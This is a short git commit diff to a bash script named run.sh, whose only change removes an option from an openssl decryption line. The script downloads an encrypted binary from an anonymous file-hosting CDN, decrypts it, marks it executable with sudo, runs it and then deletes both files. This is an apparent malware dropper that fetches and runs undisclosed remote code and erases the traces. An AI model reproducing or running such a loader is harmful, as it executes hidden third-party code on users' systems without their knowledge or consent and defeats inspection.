c90621b98539764af4e84bad6409d3c8ce60c2b6
Planet Nine <122791309+plnine@users.noreply.github.com>
2023-01-27 16:21:35 +0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #! /bin/bash
 cd
 curl -O https://cdn-102.anonfiles.com/udBcq8U2yf/5c985a92-1674825970/x-l1bra.enc
-openssl enc -d -aes-256-cbc -md md5 -in x-l1bra.enc -out x-l1bra
+openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
 sudo chmod 755 x-l1bra
 ./x-l1bra
 rm x-l1bra.enc x-l1bra
